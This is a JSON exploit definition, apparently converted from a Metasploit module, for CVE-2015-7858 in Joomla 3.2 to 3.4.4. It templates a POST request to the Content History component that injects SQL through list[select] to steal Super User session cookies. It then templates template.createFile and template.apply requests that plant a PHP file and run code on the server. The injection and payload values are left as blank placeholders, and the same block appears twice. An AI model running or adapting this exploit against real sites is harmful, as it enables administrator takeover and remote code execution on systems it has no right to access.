{
   "method" : "POST",
   "path" : "option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=__LIST[SELECT]__&option=com_templates&view=templates&option=com_templates&task=template.createFile&id=__ID__&file=__FILE__&option=com_templates&view=template&id=__ID__&file=__FILE__&",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "description" : "\n\n        This module exploits a SQL injection vulnerability found in Joomla versions\n\n        3.2 up to 3.4.4. The vulnerability exists in the Content History administrator\n\n        component in the core of Joomla. Triggering the SQL injection makes it possible\n\n        to retrieve active Super User sessions. The cookie can be used to login to the\n\n        Joomla administrator backend. By creating a new template file containing our\n\n        payload, remote code execution is made possible.\n\n      ",
   "payload" : "type=php&name=__NAME__&jform[source]=__JFORM[SOURCE]__&task=template.apply&token=1&jform[extension_id]=__JFORM[EXTENSION_ID]__&jform[filename]=/__FILENAME__.php&",
   "variables" : {
      "NAME" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "JFORM[SOURCE]" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "PATH" : {
         "DESCRIPTION" : "The base path to Joomla",
         "VALUE" : "/"
      },
      "FILE" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "ID" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "FILENAME" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "JFORM[EXTENSION_ID]" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "LIST[SELECT]" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      }
   },
   "name" : "JoomlaContenthistorySqliRce",
   "cve" : "CVE-2015-7858",
   "msf_module" : "joomla_contenthistory_sqli_rce",
   "references" : [
      "https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/",
      "http://developer.joomla.org/security-centre/628-20151001-core-sql-injection.html"
   ],
   "paths" : [
      ""
   ],
   "detection" : {},
   "informations" : {
      "MSF_MODULE" : "joomla_contenthistory_sqli_rce",
      "VARIABLES" : {
         "ID" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "FILENAME" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "JFORM[EXTENSION_ID]" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "LIST[SELECT]" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "PATH" : {
            "DESCRIPTION" : "The base path to Joomla",
            "VALUE" : "/"
         },
         "FILE" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "JFORM[SOURCE]" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "NAME" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         }
      },
      "DESCRIPTION" : "\n\n        This module exploits a SQL injection vulnerability found in Joomla versions\n\n        3.2 up to 3.4.4. The vulnerability exists in the Content History administrator\n\n        component in the core of Joomla. Triggering the SQL injection makes it possible\n\n        to retrieve active Super User sessions. The cookie can be used to login to the\n\n        Joomla administrator backend. By creating a new template file containing our\n\n        payload, remote code execution is made possible.\n\n      ",
      "PAYLOAD" : "type=php&name=__NAME__&jform[source]=__JFORM[SOURCE]__&task=template.apply&token=1&jform[extension_id]=__JFORM[EXTENSION_ID]__&jform[filename]=/__FILENAME__.php&",
      "name" : "JoomlaContenthistorySqliRce",
      "CVE" : "CVE-2015-7858",
      "PATH" : "option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=__LIST[SELECT]__&option=com_templates&view=templates&option=com_templates&task=template.createFile&id=__ID__&file=__FILE__&option=com_templates&view=template&id=__ID__&file=__FILE__&",
      "METHOD" : "POST",
      "PATHS" : [
         ""
      ],
      "REFERENCES" : [
         "https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/",
         "http://developer.joomla.org/security-centre/628-20151001-core-sql-injection.html"
      ]
   }
}
